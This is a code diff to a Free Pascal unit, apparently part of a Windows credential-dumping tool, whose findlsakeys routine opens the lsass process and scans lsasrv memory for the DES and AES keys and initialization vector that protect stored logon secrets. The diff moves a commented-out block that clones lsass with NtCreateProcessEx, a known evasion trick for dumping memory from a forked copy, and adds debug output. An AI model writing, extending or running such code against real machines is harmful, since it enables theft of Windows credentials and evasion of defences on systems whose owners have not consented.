@@ -1,6 +1,5 @@
 unit uLSA;
 
-//{$mode delphi}
 {$mode objfpc}{$H+}
 
 interface
@@ -720,7 +719,31 @@ lib2:integer;
 begin
 log('**** findlsakeys ****');
   result:=false;
+ (*
+  //mio
+  log('mio',1);
+  lib2:=loadlibrary('ntdll.dll');
+    hprocess:=openprocess(PROCESS_CREATE_PROCESS, False, pid);
+    writeln('[+] Process Handle: '+hprocess.ToString());
+    if hprocess<>thandle(-1) then
+     begin
+      writeln('opened hprocess');
+      ZeroMemory(@clone,sizeof(clone));
+      writeln('zeromemory ok');
+      status := NtCreateProcessEx(@clone,PROCESS_ALL_ACCESS,nil,hprocess,0,0,0,0,0);
+      write('cloned to handle: ');
+      writeln(clone);
+
+     end
+    else begin
+          writeln('failed ntcreateprocess ulsa');
+          exit;
+         end;
+  //mio
+ *)
+  //if symmode =true then begin result:=findlsakeys_sym (clone,DesKey ,aeskey ,iv);exit;end;
   if symmode =true then begin result:=findlsakeys_sym (pid,DesKey ,aeskey ,iv);exit;end;
+  writeln('_sym');
   // OS detection
 if lowercase(osarch) ='x86' then
    begin
@@ -781,6 +804,8 @@ log('keySigOffset:'+inttohex(keySigOffset,sizeof(pointer)),0); //dd lsasrv!LsaIn
 writeln('offline out');
 //lets search in lsass mem now
 hprocess2:=openprocess( PROCESS_CREATE_PROCESS,false,pid);
+
+//hprocess2:=openprocess( PROCESS_CREATE_PROCESS,false,clone);
 InitializeObjectAttributes(oa,nil,0,0,nil);
 cid.UniqueProcess :=pid;
 cid.UniqueThread :=0;
@@ -843,27 +868,7 @@ if lsasrvMem=0 then exit;
 //InitializationVector
 //Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
 
-//mio
-(*
-lib2:=loadlibrary(pchar(sysdir+'\ntdll.dll'));
 
-  writeln('[+] Process Handle: '+hprocess.ToString());
-  if hprocess<>thandle(-1) then
-   begin
-    writeln('opened hprocess');
-    ZeroMemory(@clone,sizeof(clone));
-    writeln('zeromemory ok');
-    status := NtCreateProcessEx(@clone,PROCESS_ALL_ACCESS,nil,hprocess2,0,0,0,0,0);
-    write('cloned to handle: ');
-    writeln(clone);
-
-   end
-  else begin
-        writeln('failed ntcreateprocess ulsa');
-        exit;
-       end;
-*)
-//mio
 //hprocess:=clone;
 writeln('dopo error');
 ivOffset:=0;
